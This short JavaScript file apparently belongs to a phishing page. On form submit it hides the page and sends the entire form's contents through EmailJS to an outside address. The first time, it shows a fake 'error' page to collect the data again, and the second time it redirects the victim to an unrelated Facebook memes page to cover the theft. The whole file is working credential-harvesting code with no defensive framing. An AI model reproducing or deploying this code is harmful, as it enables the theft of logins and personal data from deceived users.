//window.history.replaceState({},'','');

const btn = document.getElementById('button');
document.getElementById('form').addEventListener('submit', function(event) {
   event.preventDefault();
   var page = localStorage.getItem("page");
   setTimeout(() => {
    document.getElementById("body").style.visibility = "hidden"
}, 500);

   if (page == 1){
      const serviceID = 'default_service';
   const templateID = 'template_lx6joje';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
       console.log('Send Email');
    }, (err) => {
      console.log('Send Email');
      console.log(JSON.stringify(err));
    }); 

    setTimeout(() => {
      location.assign("error/");
      localStorage.setItem("page",2)
  }, 1000);
   } else {

    const serviceID = 'default_service';
   const templateID = 'template_lx6joje';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
       console.log('Send Email');
    }, (err) => {
      console.log('Send Email');
      console.log(JSON.stringify(err));
    });

    setTimeout(() => {
      location.assign("https://es-la.facebook.com/memes/");
    }, 1000);
   }
});